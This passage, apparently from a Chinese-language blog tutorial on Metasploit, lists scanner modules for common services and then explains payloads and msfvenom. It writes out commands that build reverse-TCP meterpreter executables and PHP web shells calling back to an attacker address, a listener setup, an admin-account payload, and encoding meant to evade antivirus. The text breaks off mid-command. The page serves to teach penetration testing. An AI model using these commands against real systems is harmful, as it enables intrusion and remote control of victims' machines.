+<h2 id="Telnet服务扫描"><a href="#Telnet服务扫描" class="headerlink" title="Telnet服务扫描"></a>Telnet服务扫描</h2><ul>
+<li>模块搜索</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/telnet</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222306363.png" alt="image-20230522230637307"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet登录</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line"></span><br><span class="line">扫描telnet版本</span><br><span class="line">auxiliary/scanner/telnet/telnet_version</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>模块使用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_version</span><br><span class="line">set RHOSTS xxx.xxx.xxx/24</span><br><span class="line">set THREADS 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSH服务扫描"><a href="#SSH服务扫描" class="headerlink" title="SSH服务扫描"></a>SSH服务扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222307334.png" alt="image-20230522230732276"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh登录</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line">ssh公共密钥认证登录</span><br><span class="line">auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line"></span><br><span class="line">扫描ssh版本测试</span><br><span class="line">auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set RHOSTS xx.xx.xx.x/24</span><br><span class="line">set THREADS 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Oracle数据库扫描"><a href="#Oracle数据库扫描" class="headerlink" title="Oracle数据库扫描"></a>Oracle数据库扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/oracle</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222309998.png" alt="image-20230522230905939"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/tnslsnr_version</span><br><span class="line">set RHOSTS xx.xx.xx.xx/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB服务扫描"><a href="#SMB服务扫描" class="headerlink" title="SMB服务扫描"></a>SMB服务扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/smb</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222310572.png" alt="image-20230522231043506"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SMB枚举</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">返回DCERPC信息</span><br><span class="line">auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">扫描SMB2协议</span><br><span class="line">auxiliary/scanner/smb/smb2</span><br><span class="line"></span><br><span class="line">扫描smb共享文件</span><br><span class="line">auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">枚举系统上的用户</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB登录</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line"></span><br><span class="line">扫描组的用户</span><br><span class="line">auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line"></span><br><span class="line">扫描系统版本</span><br><span class="line">auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.1.111</span><br><span class="line">run</span><br><span class="line">db_hosts –c address,os_flavor</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSSQL服务扫描"><a href="#MSSQL服务扫描" class="headerlink" title="MSSQL服务扫描"></a>MSSQL服务扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/mssql</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222311529.png" alt="image-20230522231136485"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MSSQL登陆工具</span><br><span class="line">scanner/mssql/mssql_login</span><br><span class="line"></span><br><span class="line">测试MSSQL的存在和信息</span><br><span class="line">scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">show options </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 255 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/ftp</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/97502/AppData/Roaming/Typora/typora-user-images/image-20230522231220387.png" alt="image-20230522231220387"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp版本扫描</span><br><span class="line">scanner/ftp/ftp_version</span><br><span class="line"></span><br><span class="line">ftp匿名登录扫描</span><br><span class="line">scanner/ftp/anonymous</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">show options </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/snmp</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222313759.png" alt="image-20230522231318694"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smtp枚举</span><br><span class="line">auxiliary/scanner/smtp/smtp_enum</span><br><span class="line"></span><br><span class="line">扫描smtp版本</span><br><span class="line">auxiliary/scanner/smtp/smtp_version</span><br></pre></td></tr></table></figure>
+
+<h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/snmp</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222314029.png" alt="image-20230522231452958"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="WMAP"><a href="#WMAP" class="headerlink" title="WMAP"></a>WMAP</h2><p>Web应用辅助扫描，漏洞查找等模块基本都在 modules&#x2F;auxiliary&#x2F; 下，Metasploit内置了 WMAP WEB 扫描器</p>
+<p>要先创建一个数据库用来存放扫描数据，初始化 wmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; load wmap</span><br><span class="line">msf &gt; help wmap</span><br><span class="line">wmap Commands</span><br><span class="line">=============</span><br><span class="line">Command       Description</span><br><span class="line">-------       -----------</span><br><span class="line">wmap_modules Manage wmap modules</span><br><span class="line">wmap_nodes   Manage nodes</span><br><span class="line">wmap_run     Test targets</span><br><span class="line">wmap_sites   Manage sites</span><br><span class="line">wmap_targets Manage targets</span><br><span class="line">wmap_vulns   Display web vulns</span><br></pre></td></tr></table></figure>
+
+<p>使用wmap扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; wmap_sites -a http://202.112.50.74 //添加要扫描的网站</span><br><span class="line">msf &gt; wmap_sites -l</span><br><span class="line">msf &gt; wmap_targets -t http://202.112.20.74 //把添加的网站作为扫描目标</span><br><span class="line">msf &gt; wmap_run -t   //查看那些模块将在扫描中使用</span><br><span class="line">msf &gt; wmap_run -e   //开始扫描</span><br><span class="line">msf &gt; vulns     //查看漏洞信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSF端口扫描"><a href="#MSF端口扫描" class="headerlink" title="MSF端口扫描"></a>MSF端口扫描</h2><p>模块路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modules/auxiliary/scanner/portscan/</span><br></pre></td></tr></table></figure>
+
+<p>模块搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search scanner/portscan</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305222316396.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/protscan/ack</span><br><span class="line">//通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/protscan/ftpbounce</span><br><span class="line">//通过FTP bounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能很好的防范此攻击，但在旧的系统上仍可以被利用</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/protscan/syn</span><br><span class="line">//使用发送TCP SYN标志的方式探测开放端口</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/protscan/tcp</span><br><span class="line">//通过一次完整的TCP连接来判断端口是否开放 最准确但是最慢</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/protscan/xmas</span><br><span class="line">//一种更为隐秘的扫描方式，通过发送FIN，PSH，URG标志，能够躲避一些高级的TCP标记检测器的过滤</span><br></pre></td></tr></table></figure>
+
+<p>一般情况下推荐使用 syn 端口扫描器，速度较快，结果准确，不易被对方察觉</p>
+<ul>
+<li>模块使用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/protscan/syn</span><br><span class="line">set RHOSTS 10.10.10.10</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSF攻击载荷模块-payloads"><a href="#MSF攻击载荷模块-payloads" class="headerlink" title="MSF攻击载荷模块 - payloads"></a>MSF攻击载荷模块 - payloads</h1><ul>
+<li>模块路径</li>
+</ul>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;payloads</p>
+</blockquote>
+<p>payload 又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。</p>
+<p>payload 模块保存在如下路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modules/payloads/&#123;singles,stages,stagers&#125;/</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payload类型"><a href="#Payload类型" class="headerlink" title="Payload类型"></a>Payload类型</h2><h3 id="singles"><a href="#singles" class="headerlink" title="singles"></a>singles</h3><p>独立载荷，可直接植入目标系统并执行相应的程序，如： shell_bind_tcp 这个payload 。</p>
+<h4 id="adduser-实例-singles"><a href="#adduser-实例-singles" class="headerlink" title="adduser 实例 (singles)"></a>adduser 实例 (singles)</h4><blockquote>
+<p>添加管理员用户，cmd执行的payload</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search adduser</span><br><span class="line">use 4</span><br><span class="line">options</span><br><span class="line">set user admin</span><br><span class="line">set pass Admin@123</span><br><span class="line">generate</span><br><span class="line">generate -f</span><br></pre></td></tr></table></figure>
+
+<p>生成exe程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search adduser</span><br><span class="line">use 3</span><br><span class="line">generate -f exe -o xxx.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="stagers"><a href="#stagers" class="headerlink" title="stagers"></a>stagers</h3><p>传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为 bind 型和 reverse 型， bind 型是需要攻击机主动连接目标端口的；而 reverse 型是目标机会反连接攻击机，需要提前设定好连接攻击机的IP地址和端口号。</p>
+<h3 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h3><p>传输体载荷，如 shell ， meterpreter 等。在 stagers 建立好稳定的连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages 。比如得到目标机的 shell ，或者 meterpreter 控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</p>
+<p>meterpreter 其实就是一个 payload ，它需要 stagers 和相应的 stages 配合运行， meterpreter 是运行在内存中的，通过注入 dll 文件实现，在目标机硬盘上不会留下文件痕迹，所以在被入侵时很难找到。</p>
+<h3 id="Stageless-payload-Staged-payload"><a href="#Stageless-payload-Staged-payload" class="headerlink" title="Stageless payload &amp; Staged payload"></a>Stageless payload &amp; Staged payload</h3><p>payload分为 staged (分阶段)和 stageless (不分阶段):</p>
+<blockquote>
+<p>Stageless payload: <platform>&#x2F;[arch]&#x2F;<single></p>
+</blockquote>
+<p>Stageless Meterpreter 是一个二进制文件，包含Meterpreter的所有必需部分以及所有必需的扩展全部捆绑在 一起，将完整的payload都编译在木马中，体积庞大，可直接独立地植入目标系统进行执行</p>
+<blockquote>
+<p>Staged payload: <platform>&#x2F;[arch]&#x2F;<stage>&#x2F;<stager></p>
+</blockquote>
+<p>Staged Meterpreter 负责建立目标用户与攻击者之间的网络连接，将执行传递到另一个阶段，MSF提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码，短小精悍且可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行，比如加载meterpreter、VNC桌面控制等复杂的大型攻击载荷。</p>
+<p>stageless 和 staged 就像web入侵里面提到的大马和小马一样，一个功能齐全，一个只是构造一个连接或命令执行，还需通过其他工具和脚本进行管理</p>
+<table>
+<thead>
+<tr>
+<th>Playroad</th>
+<th>Staged</th>
+<th>Stageless</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Reverse TCP</td>
+<td>windows&#x2F;meterpreter&#x2F;reverse_tcp</td>
+<td>windows&#x2F;meterpreter_reverse_tcp</td>
+</tr>
+<tr>
+<td>Reverse HTTPS</td>
+<td>windows&#x2F;meterpreter&#x2F;reverse_https</td>
+<td>windows&#x2F;meterpreter_reverse_https</td>
+</tr>
+<tr>
+<td>Bind TCP</td>
+<td>windows&#x2F;meterpreter&#x2F;bind_tcp</td>
+<td>windows&#x2F;meterpreter_bind_tcp</td>
+</tr>
+<tr>
+<td>Reverse TCP IPv6</td>
+<td>windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp</td>
+<td>windows&#x2F;meterpreter_reverse_ipv6_tcp</td>
+</tr>
+</tbody></table>
+<h2 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h2><h3 id="msfvenom简介"><a href="#msfvenom简介" class="headerlink" title="msfvenom简介"></a>msfvenom简介</h3><p>Msfvenom — Metasploit 独立有效负载生成器，是用来生成后门的软件，在目标机上执行后门上线。</p>
+<h3 id="msfvenom选项"><a href="#msfvenom选项" class="headerlink" title="msfvenom选项"></a>msfvenom选项</h3><blockquote>
+<p>Options：</p>
+<p>-p：–payload，指定特定的 Payload，如果被设置为-，那么从标准输入流中读取。几乎支持全平台。 指定操作系统</p>
+<p>-l：–list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</p>
+<p>-n：–nopsled，指定 nop在 payload中的数量</p>
+<p>-f：–format，指定 Payload的输出格式（–listformats：列出所有可用的输出格式） php exe</p>
+<p>-e：–encoder，指定使用编码的encoder</p>
+<p>X86&#x2F;shikata_ga_nai最流行的编码，等级为excellent；</p>
+<p>解码和编码过程都是随机生成的；cmd&#x2F;powershell_base64也为excellent；</p>
+<p>-a：–arch，指定目标系统架构 arm-安卓 x86 mips工业系统-路由器-交换机</p>
+<p>–platform：指定目标系统平台 linus windows ios 安卓</p>
+<p>-s：–space，设置未经编码的 Payload的最大长度（–encoder-space：编码后的 Payload的最大长度）</p>
+<p>-b：–bad-chars，设置需要在 Payload中避免出现的字符，例如：’\0f’、’\x00’等</p>
+<p>-i：–iterations，设置 Payload的编码次数</p>
+<p>–smallest：尽可能生成最短的 Payload</p>
+<p>-o：–out，保存 Payload到文件</p>
+<p>-c：–add-code，指定一个附加的win32 shellcode文件</p>
+<p>-x：–template，指定一个特定的可执行文件作为模板</p>
+<p>-k：–keep，保护模板程序的功能，注入的payload作为一个新的进程运行</p>
+<p>-v, –var-name，指定一个自定义的变量，以确定输出格式</p>
+<p>-t, –timeout，从STDIN读取有效负载时要等待的秒数（默认为30，0 为禁用）</p>
+<p> -h, –help，查看帮助选项<br>     –help-formats，查看msf支持的输出格式列表</p>
+</blockquote>
+<h3 id="msfvenom生成payload"><a href="#msfvenom生成payload" class="headerlink" title="msfvenom生成payload"></a>msfvenom生成payload</h3><p>生成 payload ，有两个必须的选项： -p 、 -f ，使用 -p 来指定要使用的payload ，使用 -f 来指定 payload 的输出格式</p>
+<ul>
+<li>查看所有 MSF 可用的 payload 列表</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看 MSF 支持的输出格式</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l formats</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看可用平台</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l platforms</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成 exe 格式的 payload</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o 123.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用自定义的 payload</li>
+</ul>
+<p>需要使用 “-“，比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对payload进行编码</li>
+</ul>
+<p>如果你使用了 -b 选项（设定了规避字符集），会自动调用编码器。</p>
+<p>其他情况下，你需要使用 -e 选项来使用编码模块，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看可用的编码器</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>迭代编码</li>
+</ul>
+<p>使用 -i 选项进行多次编码</p>
+<p>某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i  3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>规避字符</li>
+</ul>
+<p>使用 -b 选项意味着在生成 payload 的时候对某些字符进行规避。当你使用这个选项的时候， msfvenom 会自动的使用合适的编码器对 payload 进行编码；比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -b \x00 -f raw</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用自定义可执行文件模板</li>
+</ul>
+<p>默认的， msfvenom 使用的模板文件保存在 msf&#x2F;data&#x2F;templates 目录中，如果你想使用你自己的模板文件，你可以使用 -x 选项来指定，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="msfvenom使用实例"><a href="#msfvenom使用实例" class="headerlink" title="msfvenom使用实例"></a>msfvenom使用实例</h3><ul>
+<li>msfvenom 生成 windows 可执行程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp</span><br><span class="line">lhost=192.168.41.128 lport=5445 -f exe -o 5445.exe</span><br><span class="line"></span><br><span class="line">-p windows/x64/meterpreter/reverse_tcp：指定payload类型为windows </span><br><span class="line">x64系统下运行的反向TCP连接的meterpreter</span><br><span class="line">lhost=192.168.41.128：指定payload反向连接的IP地址</span><br><span class="line">lport=5445：指定payload反向连接的端口号</span><br><span class="line">-f exe：生成exe格式的payload</span><br><span class="line">-o m1.exe：保存payload为5445.exe文件名</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>msfconsole 开启监听</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload </span><br><span class="line">windows/meterpreter/reverse_tcp  </span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.41.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 5445  </span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>msfvenom 生成 payload ( web payload )</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php：</span><br><span class="line">msfvenom-p php/meterpreter/reverse_tcp LHOST=192.168.2.2 </span><br><span class="line">LPORT=4444 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">asp：</span><br><span class="line">msfvenom -a x64 --platform windows -p </span><br><span class="line">windows/meterpreter/reverse_tcp 